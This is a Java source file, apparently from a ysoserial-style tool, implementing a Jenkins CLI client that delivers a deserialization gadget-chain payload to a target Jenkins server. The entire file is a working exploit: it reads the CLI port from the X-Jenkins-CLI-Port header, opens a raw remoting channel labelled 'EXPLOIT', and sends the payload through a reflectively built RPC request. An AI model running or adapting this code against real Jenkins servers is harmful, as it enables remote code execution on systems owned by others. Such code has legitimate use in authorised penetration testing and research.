package com.h2tg.ysogate.server;

import hudson.remoting.Callable;
import hudson.remoting.Channel;
import hudson.remoting.Channel.Mode;
import hudson.remoting.ChannelBuilder;
import com.h2tg.ysogate.Main;
import com.h2tg.ysogate.utils.Reflections;

import javax.net.SocketFactory;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;

/**
 * Jenkins CLI client
 * <p>
 * Jenkins unfortunately is still using a custom serialization based
 * protocol for remote communications only protected by a blacklisting
 * application level filter.
 * <p>
 * This is a generic client delivering a gadget chain payload via that protocol.
 *
 * @author mbechler
 */
public class JenkinsCLI {

	public static final void main(final String[] args) {
		if (args.length < 5) {
			System.err.println(JenkinsCLI.class.getName() + " <jenkins_url> <args...>");
			System.exit(-1);
		}

		String jenkinsUrl = args[0];
		// 去除前一个参数
		String[] newArray = new String[args.length - 1];
		System.arraycopy(args, 1, newArray, 0, newArray.length);

		Main.main(newArray);
		Object payloadObject = Main.PAYLOAD;

		Channel c = null;
		try {
			InetSocketAddress isa = JenkinsCLI.getCliPort(jenkinsUrl);
			c = JenkinsCLI.openChannel(isa);
			c.call(getPropertyCallable(payloadObject));
		} catch (Throwable e) {
			e.printStackTrace();
		} finally {
			if (c != null) {
				try {
					c.close();
				} catch (IOException e) {
					e.printStackTrace(System.err);
				}
			}
		}
	}

	public static Callable<?, ?> getPropertyCallable(final Object prop)
			throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
		Class<?>       reqClass = Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");
		Constructor<?> reqCons  = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
		Reflections.setAccessible(reqCons);
		Object getJarLoader = reqCons
				.newInstance(1, Class.forName("hudson.remoting.IChannel").getMethod("getProperty", Object.class), new Object[]{
						prop
				});
		return (Callable<?, ?>) getJarLoader;
	}

	public static InetSocketAddress getCliPort(String jenkinsUrl) throws MalformedURLException, IOException {
		URL u = new URL(jenkinsUrl);

		URLConnection conn = u.openConnection();
		if (!(conn instanceof HttpURLConnection)) {
			System.err.println("Not a HTTP URL");
			throw new MalformedURLException();
		}

		HttpURLConnection hc = (HttpURLConnection) conn;
		if (hc.getResponseCode() >= 400) {
			System.err.println("* Error connection to jenkins HTTP " + u);
		}
		int clip = Integer.parseInt(hc.getHeaderField("X-Jenkins-CLI-Port"));

		return new InetSocketAddress(u.getHost(), clip);
	}

	public static Channel openChannel(InetSocketAddress isa) throws IOException, SocketException {
		System.err.println("* Opening socket " + isa);
		Socket s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
		s.setKeepAlive(true);
		s.setTcpNoDelay(true);

		System.err.println("* Opening channel");
		OutputStream     outputStream = s.getOutputStream();
		DataOutputStream dos          = new DataOutputStream(outputStream);
		dos.writeUTF("Protocol:CLI-connect");
		ExecutorService cp = Executors.newCachedThreadPool(new ThreadFactory() {

			public Thread newThread(Runnable r) {
				Thread t = new Thread(r, "Channel");
				t.setDaemon(true);
				return t;
			}
		});
		Channel c = new ChannelBuilder("EXPLOIT", cp).withMode(Mode.BINARY).build(s.getInputStream(), outputStream);
		System.err.println("* Channel open");
		return c;
	}
}
